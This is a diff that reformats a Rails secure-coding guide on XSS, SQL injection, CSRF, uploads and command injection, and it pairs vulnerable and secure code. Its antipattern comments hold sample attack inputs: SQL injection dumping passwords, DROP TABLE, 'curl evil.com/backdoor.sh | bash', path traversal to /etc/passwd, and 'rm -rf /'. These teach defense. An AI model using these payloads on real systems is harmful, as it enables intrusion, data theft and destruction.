@@ -70,6 +70,7 @@ Prevent critical security vulnerabilities in Rails applications: XSS, SQL inject
 <div class="content">
   <%= @feedback.content %>
 </div>
+
 ```
 
 **Attack Input:** `<script>alert('XSS')</script>`
@@ -89,6 +90,7 @@ Browser displays the text, doesn't execute it.
 <%= sanitize(@feedback.content,
     tags: %w[p br strong em a ul ol li],
     attributes: %w[href title]) %>
+
 ```
 
 **Input:** `<p>Hello <strong>world</strong></p><script>alert('XSS')</script>`
@@ -118,16 +120,20 @@ Rails.application.config.content_security_policy_nonce_generator = ->(request) {
   SecureRandom.base64(16)
 }
 Rails.application.config.content_security_policy_nonce_directives = %w[script-src]
+
 ```
 
 **View with Nonce:**
+
 ```erb
 <%= javascript_tag nonce: true do %>
   console.log('This is allowed');
 <% end %>
+
 ```
 
 **CSP Violation Reporting:**
+
 ```ruby
 # app/controllers/csp_reports_controller.rb
 class CspReportsController < ApplicationController
@@ -142,6 +148,7 @@ class CspReportsController < ApplicationController
     head :no_content
   end
 end
+
 ```
 
 **Why CSP:** Blocks XSS even if malicious script reaches the page, defense-in-depth strategy.
@@ -162,6 +169,7 @@ class UserCommentComponent < ViewComponent::Base
   private
   attr_reader :comment
 end
+
 ```
 
 ```erb
@@ -170,6 +178,7 @@ end
   <div class="author"><%= comment.author_name %></div>
   <div class="content"><%= comment.content %></div>
 </div>
+
 ```
 
 **Benefits:** Automatic escaping, encapsulated logic, testable, no accidental `html_safe`.
@@ -199,13 +208,16 @@ class Feedback < ApplicationRecord
     )
   end
 end
+
 ```
 
 **View:**
+
 ```erb
 <div class="markdown-content">
   <%= @feedback.content_html.html_safe %>
 </div>
+
 ```
 
 **Why Safe:** Markdown filtered for HTML, output sanitized with allowlist, double protection layer.
@@ -216,18 +228,22 @@ end
 <reason>Allows malicious script execution - CRITICAL vulnerability</reason>
 
 <bad-example>
+
 ```erb
 <%# CRITICAL VULNERABILITY %>
 <%= @comment.html_safe %>
 <%= raw(@feedback.content) %>
+
 ```
 </bad-example>
 
 <good-example>
+
 ```erb
 <%# SECURE - Auto-escaped or sanitized %>
 <%= @comment %>
 <%= sanitize(@feedback.content, tags: %w[p br strong em]) %>
+
 ```
 </good-example>
 </antipattern>
@@ -256,6 +272,7 @@ Project.where(name: params[:name], status: params[:status], user_id: current_use
 
 # ✅ SECURE - IN queries (works with arrays)
 Project.where(id: params[:ids])
+
 ```
 
 **Why Secure:** ActiveRecord automatically escapes values and prevents injection.
@@ -276,6 +293,7 @@ User.where("login = ? AND status = ? AND created_at > ?",
 # ✅ SECURE - Complex conditions
 Feedback.where("status = ? AND (priority = ? OR created_at < ?)",
   params[:status], "high", 1.day.ago)
+
 ```
 
 **Why Secure:** Rails escapes each parameter value, preventing injection.
@@ -292,6 +310,7 @@ Book.where("title LIKE ?", "#{search_term}%")
 # ✅ SECURE - Case-insensitive search
 search_term = Book.sanitize_sql_like(params[:query])
 Book.where("LOWER(title) LIKE LOWER(?)", "%#{search_term}%")
+
 ```
 
 **Why Sanitize:** Without `sanitize_sql_like`, users could inject `%` or `_` wildcards.
@@ -302,6 +321,7 @@ Book.where("LOWER(title) LIKE LOWER(?)", "%#{search_term}%")
 <reason>CRITICAL - Allows arbitrary SQL injection</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ CRITICAL VULNERABILITY
 Project.where("name = '#{params[:name]}'")
@@ -313,10 +333,12 @@ User.find_by("login = '#{params[:login]}' AND password = '#{params[:password]}'"
 # ❌ CRITICAL - Data exfiltration
 Project.where("id = #{params[:id]}")
 # Attack: params[:id] = "1 UNION SELECT id,email,password,1,1 FROM users"
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Use placeholders
 Project.where("name = ?", params[:name])
@@ -328,6 +350,7 @@ User.find_by(login: params[:login], password: params[:password])
 
 # ✅ SECURE - Type conversion prevents injection
 Project.where(id: params[:id].to_i)
+
 ```
 </good-example>
 </antipattern>
@@ -348,6 +371,7 @@ def index
 
   @projects = Project.order("#{column} #{direction}")
 end
+
 ```
 
 **Why Secure:** User input limited to predefined safe values, SQL injection impossible.
@@ -358,19 +382,23 @@ end
 <reason>Allows column enumeration and SQL injection</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ VULNERABLE
 Project.order("#{params[:sort]} #{params[:direction]}")
 # Attack: params[:sort] = "name); DROP TABLE projects; --"
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Allowlist only
 allowed = %w[name created_at]
 column = allowed.include?(params[:sort]) ? params[:sort] : "created_at"
 Project.order(column)
+
 ```
 </good-example>
 </antipattern>
@@ -404,6 +432,7 @@ class Project < ApplicationRecord
 end
 
 Project.active.by_user(params[:user_id]).search(params[:query])
+
 ```
 
 **Why Secure:** ActiveRecord automatically escapes all parameters.
@@ -429,6 +458,7 @@ class ApplicationController < ActionController::Base
   protect_from_forgery with: :exception
   # Raises ActionController::InvalidAuthenticityToken if token invalid
 end
+
 ```
 
 **Why :exception is Best:** Makes failures visible, prevents silent bypasses, forces proper error handling.
@@ -446,15 +476,18 @@ end
   <%= form.text_field :recipient_email %>
   <%= form.submit "Submit" %>
 <% end %>
+
 ```
 
 **Generated HTML:**
+
 ```html
 <form action="/feedbacks" method="post">
   <input type="hidden" name="authenticity_token" value="SECURE_TOKEN">
   <input type="text" name="feedback[content]">
   <input type="submit" value="Submit">
 </form>
+
 ```
 
 **Why Secure:** Rails validates token matches session.
@@ -471,6 +504,7 @@ end
   <title>My App</title>
   <%= csrf_meta_tags %>
 </head>
+
 ```
 </pattern>
 
@@ -491,6 +525,7 @@ fetch("/feedbacks", {
     feedback: { content: "test", recipient_email: "user@example.com" }
   })
 });
+
 ```
 
 **Why Secure:** Rails checks `X-CSRF-Token` header matches session token.
@@ -501,6 +536,7 @@ fetch("/feedbacks", {
 <reason>CRITICAL - Allows attackers to perform actions as authenticated users</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ CRITICAL VULNERABILITY
 class FeedbacksController < ApplicationController
@@ -511,10 +547,12 @@ class FeedbacksController < ApplicationController
     redirect_to @feedback
   end
 end
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Keep CSRF protection enabled
 class FeedbacksController < ApplicationController
@@ -525,6 +563,7 @@ class FeedbacksController < ApplicationController
     redirect_to @feedback
   end
 end
+
 ```
 </good-example>
 </antipattern>
@@ -535,11 +574,14 @@ end
 <description>Use @rails/request.js for automatic CSRF handling</description>
 
 **Installation:**
+
 ```bash
 npm install @rails/request.js
+
 ```
 
 **Usage:**
+
 ```javascript
 // ✅ SECURE - Token automatically included
 import { post, patch, destroy } from '@rails/request.js'
@@ -555,6 +597,7 @@ await patch('/feedbacks/123', {
 })
 
 await destroy('/feedbacks/123', { responseKind: 'json' })
+
 ```
 
 **Why Recommended:** Automatic CSRF token handling, consistent API, Rails-aware error handling.
@@ -579,6 +622,7 @@ class Api::V1::BaseController < ApplicationController
     head :unauthorized unless @current_api_user
   end
 end
+
 ```
 
 **Why Skip CSRF for APIs:** API clients use Bearer tokens (not cookies), tokens must be explicitly sent, CSRF only affects cookie-based authentication.
@@ -610,6 +654,7 @@ class ApplicationController < ActionController::Base
     reset_session
   end
 end
+
 ```
 
 **Why Important:** Users see helpful error, security events logged, stale sessions cleared.
@@ -628,6 +673,7 @@ Rails.application.config.session_store :cookie_store,
   secure: Rails.env.production?,      # HTTPS only in production
   httponly: true,                     # Not accessible via JavaScript
   expire_after: 24.hours
+
 ```
 
 **SameSite Options:**
@@ -655,6 +701,7 @@ Rails.application.config.session_store :cookie_store,
 <description>Use ActiveStorage for automatic security handling</description>
 
 **Model:**
+
 ```ruby
 class Feedback < ApplicationRecord
   has_one_attached :screenshot
@@ -668,9 +715,11 @@ class Feedback < ApplicationRecord
     content_type: ["application/pdf", "text/plain"],
     size: { less_than: 10.megabytes }
 end
+
 ```
 
 **Controller:**
+
 ```ruby
 class FeedbacksController < ApplicationController
   def create
@@ -688,15 +737,18 @@ class FeedbacksController < ApplicationController
     params.expect(feedback: [:content, :recipient_email, :screenshot, documents: []])
   end
 end
+
 ```
 
 **View:**
+
 ```erb
 <%= form_with model: @feedback do |f| %>
   <%= f.file_field :screenshot, accept: "image/*" %>
   <%= f.file_field :documents, multiple: true, accept: ".pdf,.txt" %>
   <%= f.submit %>
 <% end %>
+
 ```
 
 **Why Secure:** Automatic filename sanitization, storage outside public/, signed URLs with expiration.
@@ -748,6 +800,7 @@ class Feedback < ApplicationRecord
     false
   end
 end
+
 ```
 
 **Why Triple Validation:** Content-Type can be spoofed, extension can be faked, magic bytes verify actual format.
@@ -779,6 +832,7 @@ class DownloadsController < ApplicationController
     feedback.user == current_user || current_user.admin?
   end
 end
+
 ```
 
 **Why Secure:** Authentication + authorization enforced, `Content-Disposition: attachment` prevents XSS.
@@ -801,6 +855,7 @@ end
 Rails.application.config.active_storage.content_types_allowed_inline = %w[
   image/png image/jpeg image/gif image/bmp image/webp application/pdf
 ]
+
 ```
 
 **Why Important:** SVG/HTML files can contain JavaScript that executes when viewed, enabling XSS.
@@ -812,17 +867,22 @@ Rails.application.config.active_storage.content_types_allowed_inline = %w[
 <description>Implement multiple layers of file size protection</description>
 
 **Application-Wide:**
+
 ```ruby
 # config/application.rb
 config.active_storage.max_file_size = 100.megabytes
+
 ```
 
 **Web Server (Nginx):**
+
 ```nginx
 client_max_body_size 100M;
+
 ```
 
 **Model-Specific:**
+
 ```ruby
 class Feedback < ApplicationRecord
   has_one_attached :avatar
@@ -831,6 +891,7 @@ class Feedback < ApplicationRecord
   validates :avatar, size: { less_than: 2.megabytes }
   validates :photos, size: { less_than: 5.megabytes }, limit: { max: 10 }
 end
+
 ```
 
 **Why Multiple Layers:** Web server rejects huge uploads early, application-wide limit prevents resource exhaustion, model limits enforce business rules.
@@ -862,6 +923,7 @@ class Feedback < ApplicationRecord
     Rails.logger.error("Virus scan failed: #{e.message}")
   end
 end
+
 ```
 
 **Why Critical:** Prevent viruses, ransomware, and malware from infecting users or servers.
@@ -884,11 +946,14 @@ class Feedback < ApplicationRecord
     image.variant(resize_to_limit: [400, 400], format: :png)
   end
 end
+
 ```
 
 **View:**
+
 ```erb
 <%= image_tag @feedback.thumbnail, alt: "Feedback screenshot" %>
+
 ```
 
 **Why Secure:** Variants re-encode images (stripping metadata/exploits), format conversion prevents attacks.
@@ -899,6 +964,7 @@ end
 <reason>CRITICAL - Enables path traversal and file overwrite attacks</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ CRITICAL VULNERABILITY
 def upload
@@ -911,10 +977,12 @@ end
 path = Rails.root.join("public/uploads/#{params[:file].original_filename}")
 File.open(path, "wb") { |f| f.write(params[:file].read) }
 # Attacker uploads malicious.html with <script> - XSS attack!
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Use ActiveStorage
 class Feedback < ApplicationRecord
@@ -927,6 +995,7 @@ def upload
   unique_name = "#{SecureRandom.uuid}_#{safe_name}"
   File.open(Rails.root.join("storage/uploads", unique_name), "wb") { |f| f.write(params[:file].read) }
 end
+
 ```
 </good-example>
 </antipattern>
@@ -936,14 +1005,17 @@ end
 <reason>Content-Type header is easily spoofed by attackers</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ VULNERABLE - Only checks Content-Type header
 validates :image, content_type: ["image/jpeg", "image/png"]
 # Attack: Upload malicious.php with Content-Type: image/jpeg
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Triple validation: content type + extension + magic bytes
 def acceptable_image
@@ -964,6 +1036,7 @@ def acceptable_image
     end
   end
 end
+
 ```
 </good-example>
 </antipattern>
@@ -995,6 +1068,7 @@ system("/bin/tar", "-czf", "backup.tar.gz", validated_directory)
 
 # ✅ SECURE - Multiple arguments
 system("wkhtmltopdf", "--quiet", "--page-size", "A4", input_file, output_file)
+
 ```
 
 **How It Works:** Array arguments bypass shell invocation, treating user input as literal arguments only.
@@ -1022,6 +1096,7 @@ def export_feedback(feedback, format, size)
   # Safe because format is from allowlist
   system("convert", "feedback.html", "output.#{format}")
 end
+
 ```
 </pattern>
 
@@ -1048,6 +1123,7 @@ system("cp #{params[:source]} #{params[:dest]}")
 
 # ✅ SECURE - Ruby method
 FileUtils.cp(params[:source], params[:dest])
+
 ```
 
 **Why Prefer Ruby:** No shell interpretation = no injection risk, better error handling.
@@ -1068,13 +1144,16 @@ system("convert input.jpg #{filename}")
 # ✅ SECURE - Multiple arguments
 args = [params[:input], params[:output]].map { |arg| Shellwords.escape(arg) }.join(" ")
 system("convert #{args} -resize 800x600")
+
 ```
 
 **How Shellwords Works:**
+
 ```ruby
 Shellwords.escape("file.jpg")           # => "file.jpg"
 Shellwords.escape("file; rm -rf /")     # => "file\\;\\ rm\\ -rf\\ /"
 Shellwords.escape("$(cat /etc/passwd)") # => "\\$\\(cat\\ /etc/passwd\\)"
+
 ```
 
 **When to Use:** Only when array form is truly not possible. Prefer array form whenever available.
@@ -1098,6 +1177,7 @@ end
 # Usage
 file_path = safe_file_path(params[:file])
 send_file file_path if File.exist?(file_path)
+
 ```
 
 **Why Important:** Prevents access to files outside intended directory.
@@ -1133,6 +1213,7 @@ class PdfGenerationJob < ApplicationJob
     raise ArgumentError, "Path outside allowed directory" unless full_path.to_s.start_with?(allowed_dir.to_s)
   end
 end
+
 ```
 
 **Why Isolate:** Limits blast radius, easier to audit, validation in one place.
@@ -1143,6 +1224,7 @@ end
 <reason>CRITICAL - Allows command injection through shell interpretation</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ CRITICAL VULNERABILITY
 output = `ls #{params[:path]}`
@@ -1153,10 +1235,12 @@ result = %x(convert #{params[:input]} output.png)
 
 system("convert #{params[:input]} -resize #{params[:size]} output.jpg")
 # Attack: params[:size] = "800x600; curl evil.com/backdoor.sh | bash"
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Use array form and capture output
 require "open3"
@@ -1170,6 +1254,7 @@ system("convert", params[:input], "output.png")
 # ✅ SECURE - Validate size format
 raise ArgumentError unless params[:size].match?(/\A\d{1,4}x\d{1,4}\z/)
 system("convert", params[:input], "-resize", params[:size], "output.jpg")
+
 ```
 </good-example>
 </antipattern>
@@ -1179,21 +1264,25 @@ system("convert", params[:input], "-resize", params[:size], "output.jpg")
 <reason>HIGH - Allows access to files outside intended directory</reason>
 
 <bad-example>
+
 ```ruby
 # ❌ VULNERABLE - Directory traversal
 file_path = Rails.root.join("uploads", params[:file])
 send_file file_path
 # Attack: params[:file] = "../../../etc/passwd"
+
 ```
 </bad-example>
 
 <good-example>
+
 ```ruby
 # ✅ SECURE - Validate path stays within directory
 base_dir = Rails.root.join("uploads")
 file_path = base_dir.join(params[:file]).expand_path
 raise ArgumentError, "Invalid file path" unless file_path.to_s.start_with?(base_dir.to_s)
 send_file file_path if File.exist?(file_path)
+
 ```
 </good-example>
 </antipattern>
@@ -1201,6 +1290,7 @@ send_file file_path if File.exist?(file_path)
 ## Testing Security Patterns
 
 <testing>
+
 ```ruby
 # test/models/feedback_test.rb
 class FeedbackTest < ActiveSupport::TestCase
@@ -1359,6 +1449,7 @@ class DownloadsControllerTest < ActionDispatch::IntegrationTest
     assert_response :forbidden
   end
 end
+
 ```
 </testing>
 
@@ -1414,6 +1505,7 @@ config.action_dispatch.default_headers = {
   'X-XSS-Protection' => '1; mode=block',
   'Referrer-Policy' => 'strict-origin-when-cross-origin'
 }
+
 ```
 
 ### Production Monitoring
